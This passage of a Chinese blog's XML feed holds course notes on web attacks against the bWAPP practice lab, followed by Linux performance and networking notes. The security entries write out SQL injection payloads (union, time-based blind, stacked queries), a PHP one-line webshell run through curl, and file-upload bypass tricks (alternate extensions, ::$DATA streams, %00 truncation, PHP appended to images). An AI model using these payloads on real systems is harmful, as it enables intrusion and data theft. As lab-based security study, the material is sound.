INTO visitors (date, user_agent, ip_address) VALUES (now(), &#39;&quot; . sqli($user_agent) . &quot;&#39;, &#39;&quot; . $ip_address . &quot;&#39;)&quot;;</code></pre><p>原始的逻辑，ip是放在ua之后显示的，现在修改代码逻辑，将ip与ua替换位置：</p><pre><code class="hljs plain">$sql &#x3D; &quot;INSERT INTO visitors (date, ip_address, user_agent) VALUES (now(), &#39;&quot; . sqli($ip_address) . &quot;&#39;, &#39;&quot; . $user_agent . &quot;&#39;)&quot;;</code></pre><p>这样处理后，服务端就不会返回我们构造的上述SQL注入语句的执行结果了。<br>此时可采用基于时间盲注的方式，通过页面的响应时间，判断SQL语句是否成功执行，再通过脚本自动测试完成信息获取：</p><pre><code class="hljs plain">123&#39;+ (select 1 from (select user()) as t where length((select database())) &#x3D; 5 and sleep(2))); #</code></pre>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《Web攻防安全实战》学习总结：SQL注入实战——利用时间盲注绕过无报错无回显场景</title>
    <link href="/2021/01/08/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
    <url>/2021/01/08/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><h2 id="时间盲注常用函数"><a href="#时间盲注常用函数" class="headerlink" title="时间盲注常用函数"></a>时间盲注常用函数</h2><pre><code class="hljs plain">substr（a,b,c）：从b位置开始，截取字符串a的c长度count（）：计算总数ascii（）：返回字符的ASCII码length（）：返回字符串的长度left（a,b）：从左到右截取字符串a的前b个字符sleep（n）：将程序挂起n秒</code></pre><h2 id="时间盲注实战"><a href="#时间盲注实战" class="headerlink" title="时间盲注实战"></a>时间盲注实战</h2><p>World War Z电影存在</p><pre><code class="hljs plain"># 判断是否存在时间盲注http:&#x2F;&#x2F;bwapp.com:8888&#x2F;sqli_15.php?title&#x3D;World War Z&#39; and sleep(2)-- &amp;action&#x3D;search# 判断数据库名长度http:&#x2F;&#x2F;bwapp.com:8888&#x2F;sqli_15.php?title&#x3D;World War Z&#39; and length(database()) &gt; 5 and sleep(2)-- &amp;action&#x3D;search# 利用substr函数遍历数据库名称字符，比如下面通过时间盲注判断数据库的第一个字符是不是bhttp:&#x2F;&#x2F;bwapp.com:8888&#x2F;sqli_15.php?title&#x3D;World War Z&#39; and substr(database(),1,1) &#x3D; &#39;b&#39; and sleep(2)-- &amp;action&#x3D;search# 自动化检测# 通过程序比较，数字的运算会更加快速方便，将字符串转换为ascii码进行对比http:&#x2F;&#x2F;bwapp.com:8888&#x2F;sqli_15.php?title&#x3D;World War Z&#39; and ascii(substr(database(),1,1))&#x3D;1 and sl eep(2)-- aaction&#x3D;searchhttp:&#x2F;&#x2F;bwapp.com:8888&#x2F;sqli_15.php?title&#x3D;World War Z&#39; and ascii(substr(database(),1,1))&#x3D;98 and sleep(2)-- aaction&#x3D;search# 自动化遍历数据库名、内容脚本</code></pre><p><img src="/img/sql/timebase/timebase1.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/timebase/timebase2.png" srcset="/img/loading.gif" alt="fileupload"></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《Web攻防安全实战》学习总结：SQL注入原理</title>
    <link href="/2020/12/27/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"/>
    <url>/2020/12/27/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="1、MySQL入门"><a href="#1、MySQL入门" class="headerlink" title="1、MySQL入门"></a>1、MySQL入门</h2><h3 id="information-schema库"><a href="#information-schema库" class="headerlink" title="information_schema库"></a>information_schema库</h3><p>信息数据库。保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p><h4 id="schemata表"><a href="#schemata表" class="headerlink" title="schemata表"></a>schemata表</h4><p>提供了当前MySQL实例中所有数据库的信息。show databases的结果就是取之此表。</p><pre><code class="hljs plain">select * from information_schema.schemata;</code></pre><h4 id="tables表"><a href="#tables表" class="headerlink" title="tables表"></a>tables表</h4><p>提供了关于数据库中的表的信息包括视图。</p><pre><code class="hljs plain">select * from information_schema.tables where table_schema&#x3D;&#39;table_name&#39;;</code></pre><h4 id="columns表："><a href="#columns表：" class="headerlink" title="columns表："></a>columns表：</h4><p>提供了表中的列信息。详细描述了某张表的所有列的信息。</p><pre><code class="hljs plain">select * from information_schema.columns where table_schema&#x3D;&#39;table_name&#39;;</code></pre><h3 id="mysql库"><a href="#mysql库" class="headerlink" title="mysql库"></a>mysql库</h3><p>MySQL核心数据库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。</p><h3 id="performance-schema库"><a href="#performance-schema库" class="headerlink" title="performance_schema库"></a>performance_schema库</h3><p>内存数据库，数据放在内存中直接操作的数据库。主要用于提高应用读写性能。</p><h3 id="sys库"><a href="#sys库" class="headerlink" title="sys库"></a>sys库</h3><p>基于IP或用户查询资源使用情况。以及表的访问信息等。</p><h2 id="SQl注入原理"><a href="#SQl注入原理" class="headerlink" title="SQl注入原理"></a>SQl注入原理</h2><p>SQL注入是发生于应用程序与数据库层的安全漏洞。如用户输入的数据被构造成恶意的SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会引发SQL注入。</p><h3 id="GET型SQL注入漏洞"><a href="#GET型SQL注入漏洞" class="headerlink" title="GET型SQL注入漏洞"></a>GET型SQL注入漏洞</h3><p>GET方法提交的内容会显示在网页URL上，通过对URL连接进行构造，获得超出权限信息的内容。<br>测试字段数量及回显的字段位置，替换选项，获取“使用的数据库用户”、“使用的数据库名称”、“当前数据库版本”、“当前使用的数据库表”</p><pre><code class="hljs plain">&#39;union select 1,user(),table_name,database(),version(),6,7 from information_schema.tables where table_schema&#x3D;database(); --+</code></pre><h3 id="POST型SQL注入漏洞"><a href="#POST型SQL注入漏洞" class="headerlink" title="POST型SQL注入漏洞"></a>POST型SQL注入漏洞</h3><p>注入信息存储于HTTP实体内容而不是URL，通过改造实体内容，达到实际执行的SQL语句获取更多信息的目的。</p><h2 id="5种不同的注入类型"><a href="#5种不同的注入类型" class="headerlink" title="5种不同的注入类型"></a>5种不同的注入类型</h2><h3 id="Boolean-based-blind-SQL-injection（布尔型注入）"><a href="#Boolean-based-blind-SQL-injection（布尔型注入）" class="headerlink" title="Boolean-based blind SQL injection（布尔型注入）"></a>Boolean-based blind SQL injection（布尔型注入）</h3><pre><code class="hljs plain">?id&#x3D;1 and substring(version(),1,1)&#x3D;5</code></pre><p>如果服务端MySQL版本是5.X，那返回的内容就和正常请求一样。</p><h3 id="UNION-query-SQL-injection（可联合查询注入）"><a href="#UNION-query-SQL-injection（可联合查询注入）" class="headerlink" title="UNION query SQL injection（可联合查询注入）"></a>UNION query SQL injection（可联合查询注入）</h3><pre><code class="hljs plain">?id&#x3D;1 union all select schema_name from information_schema.schemata</code></pre><p>最快捷的方法，通过union查询获取所有想要的数据，前提是返回中会携带SQL执行后查询到的内容，利用难度较大</p><h3 id="Time-based-blind-SQL-injection（基于时间延迟注入）"><a href="#Time-based-blind-SQL-injection（基于时间延迟注入）" class="headerlink" title="Time-based blind SQL injection（基于时间延迟注入）"></a>Time-based blind SQL injection（基于时间延迟注入）</h3><pre><code class="hljs plain">select * from user where id&#x3D;&#39;4&#39; and sleep(3);</code></pre><p>通过判断请求的响应时间，判断SQL是否成功执行，常用于页面无回显的场景</p><h3 id="Error-based-SQL-injection（报错型注入）"><a href="#Error-based-SQL-injection（报错型注入）" class="headerlink" title="Error-based SQL injection（报错型注入）"></a>Error-based SQL injection（报错型注入）</h3><p>如果后端能返回SQL报错信息，则考虑使用报错型注入，如利用group by的duplicate entry错误。</p><h3 id="Stacked-querier-SQL-injection（可多语句查询注入）"><a href="#Stacked-querier-SQL-injection（可多语句查询注入）" class="headerlink" title="Stacked querier SQL injection（可多语句查询注入）"></a>Stacked querier SQL injection（可多语句查询注入）</h3><pre><code class="hljs plain">?id&#x3D;1;update t set name &#x3D;&#39;a&#39; where id &#x3D;1</code></pre><p>能执行多条查询语句，非常危险，意味着可直接更新数据库。</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《Web攻防安全实战》学习总结：文件上传漏洞</title>
    <link href="/2020/12/05/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2020/12/05/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="1、漏洞原理：Webshell"><a href="#1、漏洞原理：Webshell" class="headerlink" title="1、漏洞原理：Webshell"></a>1、漏洞原理：Webshell</h2><p>webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限。<br>webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。<br>关键函数：以php为例，eval（），执行用户输入的函数。</p><h2 id="2、一句话木马"><a href="#2、一句话木马" class="headerlink" title="2、一句话木马"></a>2、一句话木马</h2><h3 id="2-1-php一句话木马"><a href="#2-1-php一句话木马" class="headerlink" title="2.1 php一句话木马"></a>2.1 php一句话木马</h3><pre><code class="hljs plain">&lt;?php @eval($_POST[&#39;hacker&#39;]);?&gt;</code></pre><p>获取post请求中hacker字段的值，并将该值转换为php代码执行；</p><h2 id="3、后缀名绕过"><a href="#3、后缀名绕过" class="headerlink" title="3、后缀名绕过"></a>3、后缀名绕过</h2><h3 id="3-1-php文件后缀名绕过"><a href="#3-1-php文件后缀名绕过" class="headerlink" title="3.1 php文件后缀名绕过"></a>3.1 php文件后缀名绕过</h3><p>apache、nginx等web服务器会加载一些语言解析器模块，如python、php、asp等，当某个特定的文件后缀名被限制上传的时候，我们就可以根据web server的解析原理，修改文件后缀名，达到绕过限制的目的，但不是所有的后缀名都能被web server解析，下面通过实战模拟探究下绕过的原理</p><h2 id="4、Windows文件流特性绕过"><a href="#4、Windows文件流特性绕过" class="headerlink" title="4、Windows文件流特性绕过"></a>4、Windows文件流特性绕过</h2><p>Windows平台使用NTFS文件流，NTFS环境一个文件默认使用的是未命名文件流，同时可创建其他命令的文件流，Windows资源管理器默认不显示出文件的命名文件流。举例：<br>1）在任一NTFS分区下打开CMD命令提示符，输入echo abcde&gt;&gt;a.txt:b.txt，则在当前目录下会生成一个名为a.txt的文件，但文件的大小为0字节，打开后也无任何内容，只有输入命令：notepad a.txt:b.txt 才能看见写入的abcde<br>2）在上边的命令中，a.txt可以不存在，也可以是某个已存的文件，文件格式无所谓，无论是.txt还是.jpg|.exe|.asp都行；b.txt也可以任意指定文件名以及后缀名。（可以将任意文本信息隐藏于任意文件中，只要不泄露冒号后的虚拟文件名(即b.txt)，别人是根本不会查看到隐藏信息的）<br>3）包含隐藏信息的文件仍然可以继续隐藏其它的内容，对比上例，我们仍然可以使用命令echo 12345&gt;&gt;a.txt:c.txt　给a.txt建立新的隐藏信息的流文件，使用命令notepad a.txt:c.txt　打开后会发现12345这段信息，而abcde仍然存在于a.txt:b.txt中丝毫不受影响。<br>当我们访问a.asp::$DATA 时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。<br>例如当.php后缀当文件类型被黑名单限制时，可以通过拦截数据包，将文件名修改为shell.php::$DATA当方式进行绕过。</p><h2 id="5、-00阶段绕过"><a href="#5、-00阶段绕过" class="headerlink" title="5、%00阶段绕过"></a>5、%00阶段绕过</h2><p>如果后端在处理上传文件的保存过程，是以路径拼接的方式，且路径是从前端获取，就可以采取路径截断的方式绕过白名单。具体手法是利用burpsuite，在我们想要截断的位置，进入十六进制，添加00截断符号。具体实现见实战模拟。</p><h2 id="6、文件头检测绕过"><a href="#6、文件头检测绕过" class="headerlink" title="6、文件头检测绕过"></a>6、文件头检测绕过</h2><p>每种文件头格式都有对应的十六进制和自负的编码形式。比如png格式的文件头标识符是89 50 4E 47，git格式的文件头标识符是47 49 46 38。在面对具有文件内容检测的上传功能时，我们可以将攻击代码和图片等文件进行聚合，实现既满足文件头检测，又可成功执行代码的效果。</p><h2 id="7、文件上传源码审计"><a href="#7、文件上传源码审计" class="headerlink" title="7、文件上传源码审计"></a>7、文件上传源码审计</h2><p>逻辑代码安全性&amp;调用函数安全性</p><h2 id="8、Fuzz"><a href="#8、Fuzz" class="headerlink" title="8、Fuzz"></a>8、Fuzz</h2><p>burpsuite —— send to intruder<br>需要准备字典 </p><h1 id="实战模拟"><a href="#实战模拟" class="headerlink" title="实战模拟"></a>实战模拟</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code class="hljs plain"># 第一次启动docker pull registry.cn-shanghai.aliyuncs.com&#x2F;yhskc&#x2F;bwappdocker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com&#x2F;yhskc&#x2F;bwapp# 根据课程中的演示搭建好 bWAPP 实验环境后，以后再启动 bWAPPdocker container list -a # 查看 container iddocker start xxx # xxx 就是上一步获得的 container id，运行完这条命令后，访问响应的网址即可</code></pre><h2 id="一句话木马上传"><a href="#一句话木马上传" class="headerlink" title="一句话木马上传"></a>一句话木马上传</h2><p>初始化bwapp，过程省略，选择文件上传漏洞 Unrestricted File Upload，按下图操作，上传一句话木马文件，并复制上传后服务器返回的文件保存地址<br><img src="/img/fileupload1.gif" srcset="/img/loading.gif" alt="fileupload"><br>构造一句话木马，在POST请求的hacker字段中写入我们希望服务器执行的代码，利用curl工具构造post请求：</p><pre><code class="hljs plain">curl -d &quot;hacker&#x3D;echo get_current_user();&quot; http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;images&#x2F;shell.phpcurl -d &quot;hacker&#x3D;echo getcwd();&quot; http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;images&#x2F;shell.php</code></pre><p>此处介绍两个php api<br>get_current_user()：获取服务所属用户名<br>getcwd()：获取当前执行目录<br>操作见下图，服务器成功返回了用户名www-data及当前执行目录/app/images</p><p><img src="/img/fileupload2.gif" srcset="/img/loading.gif" alt="fileupload"></p><h2 id="文件名后缀绕过"><a href="#文件名后缀绕过" class="headerlink" title="文件名后缀绕过"></a>文件名后缀绕过</h2><p>将文件上传等级设置为 medium，上传文件后缀为php时，显示被拦截，如下：<br><img src="/img/hz.gif" srcset="/img/loading.gif" alt="fileupload"><br>将shell.php文件后缀修改为php3和php30，上传php3后缀文件时，可成功绕过后缀名限制<br><img src="/img/hz3.png" srcset="/img/loading.gif" alt="fileupload"><br>上传shell.php30文件，服务器将文件当作txt文本进行了处理，直接打印了文件内容<br><img src="/img/hz.png" srcset="/img/loading.gif" alt="fileupload"><br>通过web server的配置文件，探究文件名绕过的原理；bwapp使用的web server是apache，通过配置文件可以了解到apache的语言解析模块文件路径</p><pre><code class="hljs plain">vim &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</code></pre><p><img src="/img/apcf.png" srcset="/img/loading.gif" alt="fileupload"><br>进入对应的语言解析模块配置文件：</p><pre><code class="hljs plain">vim &#x2F;etc&#x2F;apache2&#x2F;mods-enabled&#x2F;php5.conf</code></pre><p><img src="/img/phpconf.png" srcset="/img/loading.gif" alt="fileupload"><br>通过配置文件可发现，php、php3、php5、phptml等文件后缀都可以被apache服务器解析，这也就是为什么刚刚上传的php3文件可被执行，php30不能被执行的原因。了解了文件名后缀的绕过原理，我们就可以通过上传不同的后缀名文件来达到文件后缀名限制绕过的目的。</p><h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h2><p>首先上传shell.php.jpg，文件可成功上传。<br><img src="/img/jieduan2.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/jieduan1.png" srcset="/img/loading.gif" alt="fileupload"><br>由于这个上传点的文件路径和文件名可控，因此考虑在php后进行截断，实现我们要上传的文件类型，同时满足文件类型校验。<br>首先利用burpsuite拦截上传请求，利用16进制输入文件截断符 00，因为键盘输入不了这个符号；同时便于查找位置，我们输入 空格（16进制数是20），便于查找需要修改的位置。将 空格20 修改为 00进行截断。可发现空格消失，同时在png后面移动光标时会发现存在一个隐藏字符，即需要移动两次才到达 .jpg 位置。<br><img src="/img/jieduan3.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/jieduan4.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/jieduan5.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/jieduan6.png" srcset="/img/loading.gif" alt="fileupload"><br>取消burpsuite拦截，文件成功上传，点击here查看，文件名被成功截断且修改为shell.png<br><img src="/img/jieduan7.png" srcset="/img/loading.gif" alt="fileupload"></p><h2 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h2><p>以php语言为例，首先准备一个普通的png格式文件，查看文件内容，文件头标志符号是完整的：<br><img src="/img/filehead.png" srcset="/img/loading.gif" alt="fileupload"><br>再准备一个用于测试的php文件，功能是输出‘test’字符串：<br><img src="/img/filehead2.png" srcset="/img/loading.gif" alt="fileupload"><br>将php文件内容追加到png文件内：</p><pre><code class="hljs plain">cat test.php &gt;&gt; filetype.png</code></pre><p><img src="/img/filehead3.png" srcset="/img/loading.gif" alt="fileupload"><br>利用php，解析png文件，php代码被成功执行，说明我们可以通过把图片和代码进行聚合的方式，让它既满足文件头的标准校验，又满足代码的执行。<br><img src="/img/filehead4.png" srcset="/img/loading.gif" alt="fileupload"></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>文件上传漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《Linux性能优化实战》学习总结：1-8讲</title>
    <link href="/2020/11/20/%E3%80%8ALinux%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-8%E8%AE%B2/"/>
    <url>/2020/11/20/%E3%80%8ALinux%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-8%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<p>uptime：获取当前时间、系统运行时间、登录用户数、平均负载<br>平均负载：单位时间内，系统处于可运行状态和不可中断状态的平均进程数，即平均活跃进程数<br>获取CPU核数：<br>top<br>grep ‘model name’ /proc/cpuinfo | wc -l<br>负载过高：平均负载&gt;CPU数量*70%<br>pidstat -u 5 1：查看进程的cpu使用情况（每5s输出一组数据）</p><p>Linux多任务：linux系统在很短时间内，将cpu轮流分配给多个任务，造成多任务同时运行的错觉<br>CPU寄存器：CPU内置的小容量、速度极快的内存<br>程序计数器：存储CPU正在执行的指令位置、或即将执行的下一指令的位置<br>CPU上下文：CPU寄存器和程序计数器<br>CPU上下文切换：把前一任务的CPU上下文保存在内核，在任务重新调度时再加载到CPU；然后加载新任务的上下文，并跳转到程序计数器所指的新位置，运行新任务<br>1）进程上下文切换：<br>进程在用户空间运行时被称为进程的用户态，陷入内核空间的时被称为进程的内核态；<br>进程从用户态到内核态的转变，是通过内核的系统调用，在同一个进程运行，称为特权模式切换；<br>进程上下文切换需要内核在CPU上运行，从一个进程切换到另一个进程；<br>2）线程上下文切换：<br>线程是调度的基本单位，而进程则是资源拥有的基本单位；<br>前后两个线程属于不同进程时资源不共享，切换过程和进程上下文切换一样；<br>前后两个线程属于同一个进程时，因为虚拟内存是共享的，所以在切换时，虚拟内存这些资源保持不动，只需切换线程的私有数据、寄存器等不共享的数据。<br>3）中断上下文切换：<br>为了快速响应硬件的事件，中断处理会打断进程的正常调度和执行，转而调用中断处理程序，响应设备事件。在中断其他进程时，需要保存当前进程的状态，但不包括用户态信息。对同一个 CPU 来说，中断处理比进程拥有更高的优先级</p><p>CPU上下文切换情况查看：vmstat、pidstat<br>cs（context switch）是每秒上下文切换的次数。<br>in（interrupt）则是每秒中断的次数。<br>r（Running or Runnable）是就绪队列的长度，也就是正在运行和等待CPU的进程数。<br>b（Blocked）则是处于不可中断睡眠状态的进程数。<br>自愿上下文切换：指进程无法获取所需资源，导致的上下文切换。如， I/O、内存等系统资源不足时，就会发生自愿上下文切换。<br>非自愿上下文切换：指进程由于时间片已到等原因，被系统强制调度，进而发生的上下文切换。如说，大量进程都在争抢 CPU 时，就容易发生非自愿上下文切换。</p><p>平均CPU使用率=1-（一段时间内空闲时间差值）/（一段时间内总CPU时间差值）<br>进程状态：<br>进程有R（正在/等待运行）、D（不可中断睡眠）、Z（僵尸进程）、S（可中断睡眠）、I（空闲状态）、T（暂停或跟踪）、X（死亡进程）七个状态<br>其中，不可中断状态，表示进程正在跟硬件交互，为了保护进程数据和硬件的一致性，系统不允许其他进<br>程或中断打断这个进程。进程长时间处于不可中断状态，通常表示系统有 I/O 性能问题。<br>僵尸进程表示进程已经退出，但它的父进程还没有回收子进程占用的资源。<br>相关联的进程使用进程组和会话进行管理</p><p>iowait过高排查： dstat、pidstat 等工具，确认是否磁盘 I/O 的问题。再使用ps 命令找到的 D 状态（即不可中断状态）的进程，查看是否是这些进程导致等待I/O<br>僵尸进程排查：使用 pstree 找出父进程后，去查看父进程的代码，检查 wait() /waitpid() 的调用，或是 SIGCHLD 信号处理函数的注册</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>CPU</category>
      
      <category>进程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：37-39讲</title>
    <link href="/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A37-39%E8%AE%B2/"/>
    <url>/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A37-39%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="平台搭建："><a href="#平台搭建：" class="headerlink" title="平台搭建："></a>平台搭建：</h3><h4 id="1、数据中心"><a href="#1、数据中心" class="headerlink" title="1、数据中心"></a>1、数据中心</h4><p>数据中心一般由多个可用区组成，每个可用区包含多个机房，每个机房又包含一片一片的机柜，每个机柜上放置服务器，机柜有接入交换机，由汇聚交换机相连；每台服务器上由Open vSwitch创建虚拟交换机并进行连接管理，同时使用VPC（虚拟私有网络）进行虚拟机的网络管理。接下来为了应对业务需求，就需要数据库对数据进行持久化保存，缓存减轻数据库读写压力，负载均衡、CDN等方式减轻服务器压力提升用户访问体验等。</p><h4 id="2、外网IP广播"><a href="#2、外网IP广播" class="headerlink" title="2、外网IP广播"></a>2、外网IP广播</h4><p>边界路由器通过BGP协议，将数据中心等外网IP对外广播，由其他运营商等路由器进行路由信息记录；</p><h4 id="3、域名解析"><a href="#3、域名解析" class="headerlink" title="3、域名解析"></a>3、域名解析</h4><p>非移动端设备的域名解析请求全过程为本地hosts文件、本地DNS解析缓存、本地DNS服务器、根DNS服务器、顶级DNS服务器、权威DNS服务器；移动端一般使用HTTPDNS服务，直接调用HTTPDNS服务器，获取到对应到公网IP。</p><h4 id="4、静态资源CDN"><a href="#4、静态资源CDN" class="headerlink" title="4、静态资源CDN"></a>4、静态资源CDN</h4><p>静态资源一般保存在nginx后等varnish缓存，对于不常更新的静态图片等会保存在对象存储里，并配置CDN，下发到边缘节点。本地 DNS 服务器去请求 CDN 的全局负载均衡器解析域名，全局负载均衡器会为用户选择一台合适的缓存服务器提供服务，将 IP 返回给客户端，客户端去访问这个边缘节点，下载资<br>源。缓存服务器响应用户请求，将用户所需内容传送到用户终端。如无用户所要内容，则会向上级请求，直至追溯至愿服务器。</p><h4 id="5、建立连接"><a href="#5、建立连接" class="headerlink" title="5、建立连接"></a>5、建立连接</h4><p>HTTP是基于TCP连接的，用户访问需要先通过TCP三次握手建立TCP连接，并各自在TCP层会晤一个连接的状态机。建立完TCP连接后，会进行HTTPS连接建立，双方协商TLS版本、加密和压缩算法，验证证书，然后创建对称密钥用于传输加密。HTTPS采用非对称加密的方式传输密钥，对称加密的方式传输数据，解决了密钥传输的安全问题，同时也提高了数据传输的效率。</p><h4 id="6、网络传输"><a href="#6、网络传输" class="headerlink" title="6、网络传输"></a>6、网络传输</h4><p>HTTP网络报文主要包括请求行、请求头部、请求正文，由浏览器或者HTTP客户端封装传递给传输层；在TCP层会把报文封装成一个个报文段，并附加上TCP头部，TCP头部包含源目的端口号，发送给网络层；IP层会附加上IP头部，包含源目IP地址等信息，将报文段封装为网络包，根据路由信息，发送往对应等网关。此时会根据ARP协议获取下一跳IP的mac地址，将下一跳的MAC作为目标地址，放入MAC头部封装，通过交换机发送。</p><h4 id="7、流控拥塞与重传"><a href="#7、流控拥塞与重传" class="headerlink" title="7、流控拥塞与重传"></a>7、流控拥塞与重传</h4><p>网络包传输链路复杂，容易产生拥塞和丢包现象，需要依靠TCP协议对包进行重传，并通过TCP的滑动窗口协议进行传输控制。</p><h4 id="8、NAT"><a href="#8、NAT" class="headerlink" title="8、NAT"></a>8、NAT</h4><p>网络包到达目标公网IP后，由于MAC地址和IP地址匹配，网络包即将进入数据中心内部，由虚拟网关节点到NAT规则将公网IP转换为VPC内对应到私网IP，在由内部路由传递到对应到服务器上，实际上不止NAT，端口也会对应到进行NAT转换，这样数据包才能传递到对应到服务上进行处理。</p><h4 id="9、RPC调用"><a href="#9、RPC调用" class="headerlink" title="9、RPC调用"></a>9、RPC调用</h4><p>网络包到达物理机A后，OVS 会将包从 VXLAN 隧道里面解出来，发给 HAProxy 所在的虚拟机。HAProxy 所在的虚拟机发现 MAC 地址匹配，目标 IP 地址匹配，就根据 TCP 端口，将包发给HAProxy 进程，因为 HAProxy 是在监听这个 TCP 端口的。HAProxy是四层负载，会将请求转发给后端的controller层，这个包发出去之后，还是会被物理机上的 OVS 放入 VXLAN 隧道里面，OVS 会将包从 VXLAN 隧道里面解出来，发给 Controller 层所在的虚拟机。由controller层处理具体http请求。</p><h4 id="10、HTTP请求处理"><a href="#10、HTTP请求处理" class="headerlink" title="10、HTTP请求处理"></a>10、HTTP请求处理</h4><p>Controller 层会通过 RPC 调用这个HTTP请求包含的服务层，以Dubbo为例：Controller 层需要读取注册中心，将具体HTTP请求的服务的进程列表拿出来，选出一个来调用。Dubbo 中默认的 RPC 协议是 Hessian2。Hessian2 将下单的远程调用序列化为二进制进行传输。调用的时候，统一使用 Hessian2 进行序列化，使用 Netty 进行传输，底层如果跨物理机，仍然需要通过 VXLAN 的封装和解封装。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>网络串讲</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
